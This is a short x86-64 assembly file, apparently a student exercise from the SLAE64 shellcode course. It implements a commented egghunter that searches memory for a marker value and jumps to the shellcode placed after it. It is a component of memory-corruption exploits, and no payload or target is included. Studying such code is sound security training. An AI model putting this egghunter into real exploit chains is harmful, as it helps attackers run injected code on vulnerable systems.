;Sathish Kumar L SLAE64 - 1408

global _start

_start:
 
egg:
  inc rdx               ; Address
  push rdx              ; pushing the value in the rdx to the stack
  pop rdi               ; sending rdx to rdi via stack
  push 0x50905090       ; pusing the egg marker into the stack
  pop rax
  inc eax               ; Real egg marker is 0x50905091 so the the eax register is increased bcz the marker shouldn't be hardcoded
  scasd                 ; check if we have found the egg 
  jnz egg               ; try the next byte in the memory
  jmp rdi               ; go to the shellcode
